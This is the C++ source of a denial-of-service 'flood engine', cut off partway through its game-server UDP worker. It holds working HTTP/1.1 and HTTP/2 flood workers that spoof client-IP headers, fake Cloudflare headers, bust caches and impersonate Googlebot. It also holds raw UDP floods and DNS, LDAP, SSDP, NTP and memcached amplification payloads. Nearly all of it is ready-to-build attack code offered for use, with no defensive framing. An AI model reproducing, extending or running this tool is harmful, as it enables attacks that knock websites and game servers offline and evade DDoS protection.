/*
 * flood.cpp — All-in-one flood engine
 * L4 UDP/TCP/ICMP + L7 HTTP/1.1 & native HTTP/2 (nghttp2)
 *
 * Build (with nghttp2 + openssl):
 *   g++ -O2 -s -pthread flood.cpp -o flood -lssl -lcrypto -lnghttp2
 *
 * Build (NO_SSL fallback — L4 only, no HTTP/2):
 *   g++ -O2 -s -pthread -DNO_SSL -DNO_HTTP2 flood.cpp -o flood
 *
 * Usage:
 *   ./flood <method> <host/url> <port> <time_seconds> [threads]
 *
 * L7 port = 0 → auto (80 or 443)
 */

#include <arpa/inet.h>
#include <chrono>
#include <cstring>
#include <fcntl.h>
#include <functional>
#include <iostream>
#include <libgen.h>
#include <map>
#include <netdb.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <netinet/tcp.h>
#include <poll.h>
#include <random>
#include <set>
#include <string>
#include <sys/socket.h>
#include <sys/types.h>
#include <thread>
#include <unistd.h>
#include <vector>
#include <atomic>
#include <mutex>
#include <sstream>
#include <algorithm>
#include <cassert>

#ifndef NO_SSL
#include <openssl/err.h>
#include <openssl/ssl.h>
#endif

#ifndef NO_HTTP2
#include <nghttp2/nghttp2.h>
#endif

// =====================================================================
// GLOBALS
// =====================================================================
static std::atomic<bool>     g_running(true);
static std::atomic<uint64_t> g_total_sent(0);

// ── L7 tick pacing ────────────────────────────────────────────────────
// 1 tick = PER_TICK_MS (50 ms). Each tick provides exactly PER_TICK_REQS
// request tokens shared across ALL worker threads. When the budget is
// exhausted, workers idle until the next tick rolls over → steady
// PER_TICK_REQS requests every 50 ms (= 2000 req/s) regardless of threads.
static const int           PER_TICK_MS   = 50;
static const int           PER_TICK_REQS = 100;
static std::atomic<int>    g_tick_no{0};
static std::atomic<int>    g_tick_budget{PER_TICK_REQS};

static bool acquire_tick_slot() {
    using namespace std::chrono;
    static const auto start = steady_clock::now();

    int tick = (int)(duration_cast<milliseconds>(steady_clock::now() - start).count() / PER_TICK_MS);
    int cur  = g_tick_no.load(std::memory_order_acquire);
    if (cur != tick) {
        int expect = cur;
        if (g_tick_no.compare_exchange_strong(expect, tick, std::memory_order_acq_rel)) {
            g_tick_budget.store(PER_TICK_REQS, std::memory_order_release);
        }
    }
    int before = g_tick_budget.fetch_sub(1, std::memory_order_acq_rel);
    return before > 0;
}

// =====================================================================
// UTILITIES
// =====================================================================
static inline std::string trim(const std::string &s) {
    auto a = s.find_first_not_of(" \t\r\n");
    if (a == std::string::npos) return "";
    auto b = s.find_last_not_of(" \t\r\n");
    return s.substr(a, b - a + 1);
}

static void parse_url(const std::string &url_in,
                      std::string &host, std::string &path, int &port,
                      int default_port) {
    std::string url = trim(url_in);
    bool is_https = false, is_http = false;
    size_t sp = url.find("://");
    if (sp != std::string::npos) {
        std::string scheme = url.substr(0, sp);
        for (auto &c : scheme) c = std::tolower(c);
        if (scheme == "https") is_https = true;
        else if (scheme == "http") is_http = true;
        url = url.substr(sp + 3);
    }
    size_t sl = url.find('/');
    if (sl == std::string::npos) { host = url; path = "/"; }
    else { host = url.substr(0, sl); path = url.substr(sl); }
    size_t cp = host.find(':');
    if (cp != std::string::npos) {
        port = std::atoi(host.substr(cp + 1).c_str());
        host = host.substr(0, cp);
    } else {
        if (port <= 0) {
            if (is_https) port = 443;
            else if (is_http) port = 80;
            else port = default_port;
        }
    }
    host = trim(host);
    path = trim(path);
    if (path.empty()) path = "/";
}

thread_local std::mt19937 tl_rng(std::random_device{}());

static std::string rand_str(size_t len) {
    static const char chars[] =
        "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
    std::uniform_int_distribution<size_t> d(0, sizeof(chars) - 2);
    std::string s(len, '\0');
    for (size_t i = 0; i < len; ++i) s[i] = chars[d(tl_rng)];
    return s;
}

static std::string rand_ip() {
    std::uniform_int_distribution<int> d(1, 254);
    return std::to_string(d(tl_rng)) + "." + std::to_string(d(tl_rng)) + "." +
           std::to_string(d(tl_rng)) + "." + std::to_string(d(tl_rng));
}

static int rand_int(int lo, int hi) {
    std::uniform_int_distribution<int> d(lo, hi);
    return d(tl_rng);
}

// =====================================================================
// HTTP FINGERPRINT POOLS
// =====================================================================
static const std::vector<std::string> UA_POOL = {
    // Chrome Windows
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    // Chrome Mac
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    // Chrome Linux
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    // Firefox
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14.4; rv:126.0) Gecko/20100101 Firefox/126.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:126.0) Gecko/20100101 Firefox/126.0",
    // Edge
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0",
    // Safari iOS
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
    // Chrome Android
    "Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.113 Mobile Safari/537.36",
    // Chrome iPad
    "Mozilla/5.0 (iPad; CPU OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
    // Googlebot (cache evasion)
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
};

static const std::vector<std::string> ACCEPT_POOL = {
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "*/*",
};

static const std::vector<std::string> ACCEPT_LANG_POOL = {
    "en-US,en;q=0.9",
    "en-GB,en;q=0.9",
    "en-US,en;q=0.8,fr;q=0.5",
    "de-DE,de;q=0.9,en;q=0.8",
    "fr-FR,fr;q=0.9,en;q=0.8",
    "es-ES,es;q=0.9,en;q=0.8",
    "ja-JP,ja;q=0.9,en;q=0.8",
    "zh-CN,zh;q=0.9,en;q=0.8",
};

static const std::vector<std::string> REFERER_POOL = {
    "https://www.google.com/search?q=",
    "https://www.bing.com/search?q=",
    "https://duckduckgo.com/?q=",
    "https://yandex.com/search/?text=",
    "https://t.co/",
    "https://www.facebook.com/l.php?u=",
    "https://www.reddit.com/r/",
    "https://news.ycombinator.com/item?id=",
    "https://www.twitter.com/",
    "https://www.linkedin.com/",
};

static const std::vector<std::string> SEC_CH_UA_POOL = {
    "\"Chromium\";v=\"125\", \"Google Chrome\";v=\"125\", \"Not-A.Brand\";v=\"99\"",
    "\"Chromium\";v=\"124\", \"Google Chrome\";v=\"124\", \"Not-A.Brand\";v=\"99\"",
    "\"Microsoft Edge\";v=\"125\", \"Chromium\";v=\"125\", \"Not-A.Brand\";v=\"99\"",
    "\"Firefox\";v=\"126\", \"Not-A.Brand\";v=\"8\"",
};

static const std::vector<std::string> SEC_CH_PLATFORM_POOL = {
    "\"Windows\"", "\"macOS\"", "\"Linux\"", "\"Android\"", "\"iOS\"",
};

static const std::string& pick(const std::vector<std::string> &v) {
    return v[rand_int(0, (int)v.size() - 1)];
}

// =====================================================================
// TCP CONNECT
// =====================================================================
static int tcp_connect(const struct sockaddr_in &sin, int timeout_ms = 3000) {
    int sock = ::socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock < 0) return -1;

    int flags = fcntl(sock, F_GETFL, 0);
    fcntl(sock, F_SETFL, flags | O_NONBLOCK);

    ::connect(sock, (struct sockaddr *)&sin, sizeof(sin));

    struct pollfd pfd{sock, POLLOUT, 0};
    if (poll(&pfd, 1, timeout_ms) <= 0) { close(sock); return -1; }
    int err = 0; socklen_t el = sizeof(err);
    if (getsockopt(sock, SOL_SOCKET, SO_ERROR, &err, &el) < 0 || err) { close(sock); return -1; }

    fcntl(sock, F_SETFL, flags);
    int one = 1;
    setsockopt(sock, IPPROTO_TCP, TCP_NODELAY, &one, sizeof(one));
    struct timeval tv{2, 0};
    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    return sock;
}

// =====================================================================
// HTTP/1.1 REQUEST BUILDER
// =====================================================================
static std::string build_h1_request(const std::string &method_name,
                                     const std::string &http_verb,
                                     const std::string &host,
                                     std::string path, int port) {
    // Cache-bust for bypass methods
    bool bust = (method_name == "cache"   || method_name == "bypass"    ||
                 method_name == "cloudflare" || method_name == "httpx"  ||
                 method_name == "rapidflood" || method_name == "tlsx"   ||
                 method_name == "browser");
    if (bust) {
        std::string sep = (path.find('?') == std::string::npos) ? "?" : "&";
        path += sep + rand_str(5) + "=" + rand_str(8);
    }

    std::string host_hdr = host;
    if (port != 80 && port != 443 && port > 0)
        host_hdr += ":" + std::to_string(port);

    std::string req;
    req.reserve(1200);
    req += http_verb + " " + path + " HTTP/1.1\r\n";
    req += "Host: " + host_hdr + "\r\n";
    req += "User-Agent: " + pick(UA_POOL) + "\r\n";
    req += "Accept: " + pick(ACCEPT_POOL) + "\r\n";
    req += "Accept-Language: " + pick(ACCEPT_LANG_POOL) + "\r\n";
    req += "Accept-Encoding: gzip, deflate, br\r\n";

    bool is_chrome = true; // vary fingerprint
    if (is_chrome) {
        req += "Sec-Ch-Ua: " + pick(SEC_CH_UA_POOL) + "\r\n";
        req += "Sec-Ch-Ua-Mobile: ?" + std::to_string(rand_int(0,1)) + "\r\n";
        req += "Sec-Ch-Ua-Platform: " + pick(SEC_CH_PLATFORM_POOL) + "\r\n";
        req += "Sec-Fetch-Dest: document\r\n";
        req += "Sec-Fetch-Mode: navigate\r\n";
        req += "Sec-Fetch-Site: " + std::string(rand_int(0,1) ? "none" : "cross-site") + "\r\n";
        req += "Sec-Fetch-User: ?1\r\n";
        req += "Upgrade-Insecure-Requests: 1\r\n";
    }

    req += "Referer: " + pick(REFERER_POOL) + host + "\r\n";

    // Cache bypass headers
    if (method_name == "cache" || method_name == "bypass" || method_name == "cloudflare") {
        req += "Cache-Control: no-cache, no-store, must-revalidate, max-age=0\r\n";
        req += "Pragma: no-cache\r\n";
        req += "Expires: 0\r\n";
    } else {
        req += "Cache-Control: max-age=0\r\n";
    }

    // IP spoofing headers
    if (method_name == "bypass" || method_name == "cloudflare" ||
        method_name == "tlsx"   || method_name == "httpx") {
        std::string fip = rand_ip();
        req += "X-Forwarded-For: " + fip + "\r\n";
        req += "X-Real-IP: " + fip + "\r\n";
        req += "CF-Connecting-IP: " + fip + "\r\n";
        req += "X-Client-IP: " + fip + "\r\n";
        req += "True-Client-IP: " + fip + "\r\n";
        req += "X-Originating-IP: " + fip + "\r\n";
    }

    if (method_name == "cloudflare") {
        req += "CF-Visitor: {\"scheme\":\"https\"}\r\n";
        req += "CF-IPCountry: US\r\n";
        req += "CF-RAY: " + rand_str(16) + "-IAD\r\n";
    }

    // POST body
    if (http_verb == "POST") {
        std::string body = "data=" + rand_str(32) + "&t=" + rand_str(8);
        req += "Content-Type: application/x-www-form-urlencoded\r\n";
        req += "Content-Length: " + std::to_string(body.size()) + "\r\n";
        req += "Connection: keep-alive\r\n\r\n";
        req += body;
    } else {
        req += "Connection: keep-alive\r\n\r\n";
    }
    return req;
}

// =====================================================================
// HTTP/1.1 WORKER (plain)
// =====================================================================
static void worker_http1(const std::string &method_name,
                          const std::string &host, const std::string &ip,
                          int port, const std::string &path) {
    struct sockaddr_in sin{};
    sin.sin_family = AF_INET;
    sin.sin_port   = htons(port > 0 ? port : 80);
    inet_pton(AF_INET, ip.c_str(), &sin.sin_addr);

    std::string http_verb = (method_name == "post") ? "POST" : "GET";
    int sock = -1;

    while (g_running.load(std::memory_order_relaxed)) {
        // Wait for a request token from the current tick budget
        if (!acquire_tick_slot()) {
            std::this_thread::sleep_for(std::chrono::milliseconds(5));
            continue;
        }

        // Re-open connection if needed
        if (sock < 0) {
            sock = tcp_connect(sin, 3000);
            if (sock < 0) continue;
        }

        std::string req = build_h1_request(method_name, http_verb, host, path, port);
        if (send(sock, req.c_str(), req.size(), MSG_NOSIGNAL) <= 0) {
            close(sock); sock = -1;
            continue;
        }
        g_total_sent.fetch_add(1, std::memory_order_relaxed);

        // Drain responses without blocking
        char drain[4096];
        while (recv(sock, drain, sizeof(drain), MSG_DONTWAIT) > 0) {}
    }
    if (sock >= 0) close(sock);
}

// =====================================================================
// HTTP/2 WORKER (nghttp2 + OpenSSL)
// =====================================================================
#ifndef NO_SSL
#ifndef NO_HTTP2

// Per-connection H2 state
struct H2Conn {
    int          fd     = -1;
    SSL         *ssl    = nullptr;
    nghttp2_session *session = nullptr;

    std::string  host;
    std::string  path;
    std::string  method_name;
    int          port = 443;
    bool         error = false;
    int          streams_open = 0;
    int          streams_sent = 0;
    int          MAX_STREAMS  = 100; // per connection lifetime (rotated)
};

static ssize_t h2_send_cb(nghttp2_session *, const uint8_t *data, size_t length,
                           int, void *ud) {
    H2Conn *c = (H2Conn *)ud;
    ssize_t n = SSL_write(c->ssl, data, (int)length);
    if (n <= 0) { c->error = true; return NGHTTP2_ERR_CALLBACK_FAILURE; }
    return n;
}

static ssize_t h2_recv_cb(nghttp2_session *, uint8_t *buf, size_t length,
                           int, void *ud) {
    H2Conn *c = (H2Conn *)ud;
    // Non-blocking read
    int n = SSL_read(c->ssl, buf, (int)length);
    if (n == 0) { c->error = true; return NGHTTP2_ERR_CALLBACK_FAILURE; }
    if (n < 0) {
        int err = SSL_get_error(c->ssl, n);
        if (err == SSL_ERROR_WANT_READ || err == SSL_ERROR_WANT_WRITE)
            return NGHTTP2_ERR_WOULDBLOCK;
        c->error = true;
        return NGHTTP2_ERR_CALLBACK_FAILURE;
    }
    return n;
}

static int h2_on_frame_send_cb(nghttp2_session *, const nghttp2_frame *frame,
                                void *ud) {
    H2Conn *c = (H2Conn *)ud;
    if (frame->hd.type == NGHTTP2_HEADERS &&
        frame->headers.cat == NGHTTP2_HCAT_REQUEST) {
        c->streams_open++;
        c->streams_sent++;
        g_total_sent.fetch_add(1, std::memory_order_relaxed);
    }
    return 0;
}

static int h2_on_stream_close_cb(nghttp2_session *session, int32_t stream_id,
                                  uint32_t, void *ud) {
    H2Conn *c = (H2Conn *)ud;
    c->streams_open--;
    (void)session; (void)stream_id;
    return 0;
}

static int h2_on_data_chunk_recv_cb(nghttp2_session *, uint8_t, int32_t,
                                     const uint8_t *, size_t, void *) {
    return 0; // discard response body
}

static int h2_on_header_cb(nghttp2_session *, const nghttp2_frame *,
                             const uint8_t *, size_t,
                             const uint8_t *, size_t,
                             uint8_t, void *) {
    return 0; // discard response headers
}

// Submit one H2 GET/POST request
static int h2_submit_request(H2Conn *c) {
    bool bust = (c->method_name == "cache"   || c->method_name == "bypass"    ||
                 c->method_name == "cloudflare" || c->method_name == "httpx"  ||
                 c->method_name == "rapidflood" || c->method_name == "tlsx"   ||
                 c->method_name == "browser"  || c->method_name == "http2");

    std::string req_path = c->path;
    if (bust) {
        std::string sep = (req_path.find('?') == std::string::npos) ? "?" : "&";
        req_path += sep + rand_str(5) + "=" + rand_str(8);
    }

    bool use_post = (c->method_name == "post");
    std::string fip = rand_ip();
    std::string cf_ray = rand_str(16) + "-IAD";

    // Build header list
    std::vector<std::string> hdr_strs;
    hdr_strs.push_back(use_post ? "POST" : "GET"); // :method
    hdr_strs.push_back("https");                    // :scheme
    std::string authority = c->host;
    if (c->port != 443) authority += ":" + std::to_string(c->port);
    hdr_strs.push_back(authority);                  // :authority
    hdr_strs.push_back(req_path);                   // :path

    // Additional headers stored as name/value pairs
    struct Hdr { std::string name, value; };
    std::vector<Hdr> extras = {
        {"user-agent",          pick(UA_POOL)},
        {"accept",              pick(ACCEPT_POOL)},
        {"accept-language",     pick(ACCEPT_LANG_POOL)},
        {"accept-encoding",     "gzip, deflate, br"},
        {"sec-ch-ua",           pick(SEC_CH_UA_POOL)},
        {"sec-ch-ua-mobile",    rand_int(0,1) ? "?0" : "?1"},
        {"sec-ch-ua-platform",  pick(SEC_CH_PLATFORM_POOL)},
        {"sec-fetch-dest",      "document"},
        {"sec-fetch-mode",      "navigate"},
        {"sec-fetch-site",      rand_int(0,1) ? "none" : "cross-site"},
        {"sec-fetch-user",      "?1"},
        {"upgrade-insecure-requests", "1"},
        {"referer",             pick(REFERER_POOL) + c->host},
    };

    if (c->method_name == "cache" || c->method_name == "bypass" || c->method_name == "cloudflare") {
        extras.push_back({"cache-control", "no-cache, no-store, must-revalidate"});
        extras.push_back({"pragma", "no-cache"});
    } else {
        extras.push_back({"cache-control", "max-age=0"});
    }

    if (c->method_name == "bypass" || c->method_name == "cloudflare" ||
        c->method_name == "tlsx"   || c->method_name == "httpx") {
        extras.push_back({"x-forwarded-for",    fip});
        extras.push_back({"x-real-ip",          fip});
        extras.push_back({"cf-connecting-ip",   fip});
        extras.push_back({"true-client-ip",     fip});
    }
    if (c->method_name == "cloudflare") {
        extras.push_back({"cf-visitor",    "{\"scheme\":\"https\"}"});
        extras.push_back({"cf-ipcountry", "US"});
        extras.push_back({"cf-ray",       cf_ray});
    }

    // Build nghttp2_nv array
    // :method :scheme :authority :path + extras
    std::vector<nghttp2_nv> nva;
    nva.reserve(4 + extras.size());

    auto push_nv = [&](const std::string &name, const std::string &value) {
        nghttp2_nv nv;
        nv.name     = (uint8_t *)name.c_str();
        nv.namelen  = name.size();
        nv.value    = (uint8_t *)value.c_str();
        nv.valuelen = value.size();
        nv.flags    = NGHTTP2_NV_FLAG_NONE;
        nva.push_back(nv);
    };

    push_nv(":method",    hdr_strs[0]);
    push_nv(":scheme",    hdr_strs[1]);
    push_nv(":authority", hdr_strs[2]);
    push_nv(":path",      hdr_strs[3]);
    for (auto &h : extras) push_nv(h.name, h.value);

    nghttp2_data_provider *dp = nullptr;
    nghttp2_data_provider dp_obj{};

    std::string post_body;
    if (use_post) {
        post_body = "data=" + rand_str(32) + "&t=" + rand_str(8);
        // Add content-type + content-length
        push_nv("content-type",   "application/x-www-form-urlencoded");
        push_nv("content-length", std::to_string(post_body.size()));

        struct PostCtx { const char *data; size_t len; size_t pos; };
        // Use a static lambda capture — lifetime tied to this scope
        // nghttp2 will call read_callback before submit returns, so stack is fine
        static thread_local PostCtx post_ctx;
        post_ctx = {post_body.c_str(), post_body.size(), 0};

        dp_obj.source.ptr = &post_ctx;
        dp_obj.read_callback = [](nghttp2_session *, int32_t, uint8_t *buf,
                                   size_t length, uint32_t *data_flags,
                                   nghttp2_data_source *src, void *) -> ssize_t {
            auto *ctx = (PostCtx *)src->ptr;
            size_t remaining = ctx->len - ctx->pos;
            if (remaining == 0) { *data_flags |= NGHTTP2_DATA_FLAG_EOF; return 0; }
            size_t n = std::min(length, remaining);
            memcpy(buf, ctx->data + ctx->pos, n);
            ctx->pos += n;
            if (ctx->pos >= ctx->len) *data_flags |= NGHTTP2_DATA_FLAG_EOF;
            return (ssize_t)n;
        };
        dp = &dp_obj;
    }

    int32_t sid = nghttp2_submit_request(c->session, nullptr,
                                          nva.data(), nva.size(), dp, nullptr);
    return (sid < 0) ? -1 : 0;
}

static void worker_http2(const std::string &method_name,
                          SSL_CTX *ssl_ctx,
                          const std::string &host,
                          const std::string &ip,
                          int port,
                          const std::string &path) {
    struct sockaddr_in sin{};
    sin.sin_family = AF_INET;
    sin.sin_port   = htons(port > 0 ? port : 443);
    inet_pton(AF_INET, ip.c_str(), &sin.sin_addr);

    bool have_conn = false;
    H2Conn conn;

    auto teardown = [&]() {
        if (conn.session) {
            nghttp2_submit_goaway(conn.session, NGHTTP2_FLAG_NONE, 0,
                                   NGHTTP2_NO_ERROR, nullptr, 0);
            nghttp2_session_send(conn.session);
            nghttp2_session_del(conn.session);
            conn.session = nullptr;
        }
        if (conn.ssl)  { SSL_shutdown(conn.ssl); SSL_free(conn.ssl); conn.ssl = nullptr; }
        if (conn.fd >= 0) { close(conn.fd); conn.fd = -1; }
        have_conn = false;
    };

    while (g_running.load(std::memory_order_relaxed)) {
        if (!acquire_tick_slot()) {
            std::this_thread::sleep_for(std::chrono::milliseconds(5));
            continue;
        }

        // Lazy connect + TLS + h2 session, kept alive across ticks
        if (!have_conn) {
            conn = H2Conn{}; // reset state
            conn.fd = tcp_connect(sin, 3000);
            if (conn.fd < 0) continue;

            conn.ssl = SSL_new(ssl_ctx);
            if (!conn.ssl) { close(conn.fd); conn.fd = -1; continue; }
            SSL_set_fd(conn.ssl, conn.fd);

            struct in_addr at{};
            if (inet_pton(AF_INET, host.c_str(), &at) != 1)
                SSL_set_tlsext_host_name(conn.ssl, host.c_str());

            // Non-blocking TLS handshake
            SSL_set_connect_state(conn.ssl);
            {
                bool hs_done = false;
                for (int attempt = 0; attempt < 50 && !hs_done; ++attempt) {
                    int ret = SSL_do_handshake(conn.ssl);
                    if (ret == 1) { hs_done = true; break; }
                    int err = SSL_get_error(conn.ssl, ret);
                    struct pollfd pfd{conn.fd, 0, 0};
                    if (err == SSL_ERROR_WANT_READ)  pfd.events = POLLIN;
                    else if (err == SSL_ERROR_WANT_WRITE) pfd.events = POLLOUT;
                    else break;
                    if (poll(&pfd, 1, 200) <= 0) break;
                }
                if (!hs_done) { teardown(); continue; }
            }

            // Require h2 via ALPN; otherwise server can't do H2
            const unsigned char *alpn = nullptr; unsigned int alpn_len = 0;
            SSL_get0_alpn_selected(conn.ssl, &alpn, &alpn_len);
            bool got_h2 = (alpn && alpn_len == 2 && alpn[0] == 'h' && alpn[1] == '2');
            if (!got_h2) { teardown(); continue; }

            conn.host        = host;
            conn.path        = path;
            conn.method_name = method_name;
            conn.port        = port;
            conn.MAX_STREAMS = 1000; // keep connection alive

            nghttp2_session_callbacks *cbs = nullptr;
            nghttp2_session_callbacks_new(&cbs);
            nghttp2_session_callbacks_set_send_callback(cbs, h2_send_cb);
            nghttp2_session_callbacks_set_recv_callback(cbs, h2_recv_cb);
            nghttp2_session_callbacks_set_on_frame_send_callback(cbs, h2_on_frame_send_cb);
            nghttp2_session_callbacks_set_on_stream_close_callback(cbs, h2_on_stream_close_cb);
            nghttp2_session_callbacks_set_on_data_chunk_recv_callback(cbs, h2_on_data_chunk_recv_cb);
            nghttp2_session_callbacks_set_on_header_callback(cbs, h2_on_header_cb);
            nghttp2_session_client_new(&conn.session, cbs, &conn);
            nghttp2_session_callbacks_del(cbs);

            nghttp2_settings_entry iv[] = {
                {NGHTTP2_SETTINGS_MAX_CONCURRENT_STREAMS, 250},
                {NGHTTP2_SETTINGS_INITIAL_WINDOW_SIZE,    65535},
                {NGHTTP2_SETTINGS_HEADER_TABLE_SIZE,      4096},
                {NGHTTP2_SETTINGS_ENABLE_PUSH,            0},
            };
            nghttp2_submit_settings(conn.session, NGHTTP2_FLAG_NONE, iv,
                                    sizeof(iv) / sizeof(iv[0]));
            nghttp2_session_send(conn.session);
            have_conn = true;
        }

        // One token = one H2 stream (request)
        if (h2_submit_request(&conn) < 0) { teardown(); continue; }

        // Flush pending frames
        int rc = nghttp2_session_send(conn.session);
        if (rc < 0) { teardown(); continue; }

        // Drain inbound frames non-blocking
        {
            int fl = fcntl(conn.fd, F_GETFL, 0);
            fcntl(conn.fd, F_SETFL, fl | O_NONBLOCK);
            rc = nghttp2_session_recv(conn.session);
            fcntl(conn.fd, F_SETFL, fl);
            if (rc < 0 && rc != NGHTTP2_ERR_WOULDBLOCK) { teardown(); continue; }
        }

        // If connection serving a max lifetime of streams, rotate
        if (conn.streams_sent >= conn.MAX_STREAMS && conn.streams_open <= 0) {
            teardown();
            continue;
        }
    }

    teardown();
}
#endif // NO_HTTP2

// =====================================================================
// HTTPS HTTP/1.1 WORKER (TLS + HTTP/1.1 fallback)
// =====================================================================
static void worker_https1(const std::string &method_name,
                           SSL_CTX *ctx,
                           const std::string &host,
                           const std::string &ip,
                           int port,
                           const std::string &path) {
    struct sockaddr_in sin{};
    sin.sin_family = AF_INET;
    sin.sin_port   = htons(port > 0 ? port : 443);
    inet_pton(AF_INET, ip.c_str(), &sin.sin_addr);

    std::string http_verb = (method_name == "post") ? "POST" : "GET";
    SSL *ssl = nullptr;
    int  sock = -1;

    while (g_running.load(std::memory_order_relaxed)) {
        if (!acquire_tick_slot()) {
            std::this_thread::sleep_for(std::chrono::milliseconds(5));
            continue;
        }

        // Lazy connect + TLS handshake, keep connection alive across ticks
        if (sock < 0) {
            sock = tcp_connect(sin, 3000);
            if (sock < 0) continue;
            ssl = SSL_new(ctx);
            if (!ssl) { close(sock); sock = -1; continue; }
            SSL_set_fd(ssl, sock);

            struct in_addr at{};
            if (inet_pton(AF_INET, host.c_str(), &at) != 1)
                SSL_set_tlsext_host_name(ssl, host.c_str());

            if (SSL_connect(ssl) <= 0) {
                SSL_free(ssl); close(sock); ssl = nullptr; sock = -1;
                continue;
            }
        }

        std::string req = build_h1_request(method_name, http_verb, host, path, port);
        if (SSL_write(ssl, req.c_str(), (int)req.size()) <= 0) {
            SSL_shutdown(ssl); SSL_free(ssl); close(sock); ssl = nullptr; sock = -1;
            continue;
        }
        g_total_sent.fetch_add(1, std::memory_order_relaxed);

        // Drain responses without blocking
        while (SSL_pending(ssl) > 0) {
            char drain[4096];
            if (SSL_read(ssl, drain, sizeof(drain)) <= 0) break;
        }
        struct pollfd pfd{sock, POLLIN, 0};
        if (poll(&pfd, 1, 0) > 0 && (pfd.revents & POLLIN)) {
            char drain[4096]; SSL_read(ssl, drain, sizeof(drain));
        }
    }

    if (ssl) {
        SSL_shutdown(ssl); SSL_free(ssl);
    }
    if (sock >= 0) close(sock);
}

#else
// Stub when compiled without SSL
static void worker_https1(const std::string &method_name, void *,
                           const std::string &host, const std::string &ip,
                           int port, const std::string &path) {
    worker_http1(method_name, host, ip, port, path);
}
#endif // NO_SSL

// =====================================================================
// LAYER 4 — UDP
// =====================================================================
static void worker_udp(const std::string &method, const std::string &ip, int port) {
    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock < 0) return;

    struct sockaddr_in sin{};
    sin.sin_family = AF_INET;
    sin.sin_port   = htons(port > 0 ? port : 53);
    inet_pton(AF_INET, ip.c_str(), &sin.sin_addr);

    while (g_running.load(std::memory_order_relaxed)) {
        std::vector<uint8_t> payload;

        if (method == "dns") {
            uint8_t pkt[] = {
                (uint8_t)rand_int(0,255), (uint8_t)rand_int(0,255),
                0x01, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                0x03, 'w', 'w', 'w', 0x06, 'g', 'o', 'o', 'g', 'l', 'e',
                0x03, 'c', 'o', 'm', 0x00, 0x00, 0xff, 0x00, 0x01
            };
            payload.assign(pkt, pkt + sizeof(pkt));
        } else if (method == "ldap") {
            uint8_t pkt[] = {
                0x30,0x25,0x02,0x01,0x01,0x63,0x20,0x04,0x00,0x0a,0x01,0x00,
                0x0a,0x01,0x00,0x02,0x01,0x00,0x02,0x01,0x00,0x01,0x01,0x00,
                0x87,0x0b,0x6f,0x62,0x6a,0x65,0x63,0x74,0x63,0x6c,0x61,0x73,
                0x73,0x30,0x00
            };
            payload.assign(pkt, pkt + sizeof(pkt));
        } else if (method == "ssdp") {
            std::string s = "M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\n"
                            "MAN: \"ssdp:discover\"\r\nMX: 1\r\nST: ssdp:all\r\n\r\n";
            payload.assign(s.begin(), s.end());
        } else if (method == "ntp") {
            uint8_t pkt[48] = {};
            pkt[0] = 0x1b; // NTP client request
            payload.assign(pkt, pkt + 48);
        } else if (method == "memcached") {
            uint8_t pkt[] = {
                0x80,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
            };
            payload.assign(pkt, pkt + sizeof(pkt));
        } else {
            // udpbypass / home / generic random
            size_t len = rand_int(512, 1400);
            payload.resize(len);
            for (size_t i = 0; i < len; ++i) payload[i] = (uint8_t)rand_int(0, 255);
        }

        if (port <= 0) {
            sin.sin_port = htons((uint16_t)rand_int(1024, 65535));
        }

        sendto(sock, payload.data(), payload.size(), 0,
               (struct sockaddr *)&sin, sizeof(sin));
        g_total_sent.fetch_add(1, std::memory_order_relaxed);
    }
    close(sock);
}

// =====================================================================
// LAYER 4 — GAME UDP
// =====================================================================
static void worker_game(const std::string &method, const std::string &ip, int port) {
    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock < 0) return;

    struct sockaddr_in sin{};
    sin.sin_family = AF_INET;
    sin.sin_port   = htons(port > 0 ? port : 7777);
    inet_pton(AF_INET, ip.c_str(), &sin.sin_addr);

    while (g_running.load(std::memory_order_relaxed)) {
        std::vector<uint8_t> payload;

        if (method == "samp") {
            uint8_t pkt[] = {'S','A','M','P',127,0,0,1,0,0,'i'};
            payload.assign(pkt, pkt + sizeof(pkt));
